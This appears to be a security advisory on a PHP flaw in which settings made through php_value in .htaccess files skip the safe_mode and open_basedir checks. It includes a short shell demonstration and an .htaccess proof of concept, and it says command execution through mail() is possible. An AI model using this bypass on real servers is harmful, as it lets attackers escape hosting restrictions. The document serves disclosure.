- - --- 0.Description ---

PHP is an HTML-embedded scripting language. Much of its syntax is borrowed 
from C, Java and Perl with a couple of unique PHP-specific features thrown 
in. The goal of the language is to allow web developers to write dynamically 
generated pages quickly.

 When using PHP as an Apache module, you can also change the configuration 
settings using directives in Apache configuration files (e.g. httpd.conf) 
and .htaccess files. You will need "AllowOverride Options" or "AllowOverride 
All" privileges to do so.


 php_value  name  value

    Sets the value of the specified directive. Can be used only with 
PHP_INI_ALL and PHP_INI_PERDIR type directives. To clear a previously set 
value use none as the value.

        Note: Don't use php_value to set boolean values. php_flag (see below) 
should be used instead. 

php_flag name on|off

    Used to set a boolean configuration directive. Can be used only with 
PHP_INI_ALL and PHP_INI_PERDIR type directives. 

    mail.force_extra_parameters - Force the addition of the specified 
parameters to be passed as extra parameters to the sendmail binary. These 
parameters will always replace the value of the 5th parameter to mail(), even 
in safe mode

- - --- 1. htaccess safemode and open_basedir Bypass Vulnerability ---

When using PHP as an Apache module, you can also change the configuration 
settings using directives in .htaccess file. These options are used by a lot 
of users to change permissions options like display_errors etc. But it is
possible to bypass a safe_mode or open_basedir in different functions.For 
example you can set session.save_path via .htaccess. In function 
session_save_path() and ini_set() save_path is checked for safe_mode and 
open_basedir. In .htaccess it is bypassed. Values from .htaccess are not 
checked.

For example:

cxib# ls -la /www/cxib/
total 14
drwxr-xr-x   3 cxib  www   512 Feb 16 20:20 .
drwxr-xr-x  11 www   www  7168 Feb 16 20:07 ..
- - -rw-r--r--   1 cxib  www    53 Feb 16 20:19 stars.php
drwxr-xr-x   2 cxib  www   512 Feb 16 20:18 temps
cxib# cat /www/cxib/stars.php
<?php
session_save_path("/inne");
session_start();
?>
cxib# telnet 0 80

So we can't create session in directory. But when we create file
.htaccess, we can
write there:

- - ---
php_value session.save_path /inne
- - ---

cxib# ls -la /www/cxib/
total 16
drwxr-xr-x   3 cxib  www   512 Feb 16 20:26 .
drwxr-xr-x  11 www   www  7168 Feb 16 20:26 ..
- - -rw-r--r--   1 cxib  www    34 Feb 16 20:26 .htaccess
- - -rw-r--r--   1 cxib  www    53 Feb 16 20:19 stars.php
drwxr-xr-x   2 cxib  www   512 Feb 16 20:18 temps
cxib# cat /www/cxib/.htaccess
php_value session.save_path /inne
cxib# cat /www/cxib/stars.php
<?php
session_start();
?>

We can't set session.save_path via ini_set() or session_save_path().
Let's try sending a  request.

cxib# telnet 0 80

Open_basedir and safe_mode are bypassed.
Same problem is in error_log and probably in other functions.

This issue allows attacker to bypass disabled_functions like system, exec etc. 
We have contacted with Stefan Esser to verify this issue, big thanks for him. 
In PHP 5.2.3 it is possible to execute command using exploit if mail() 
function is allowed.
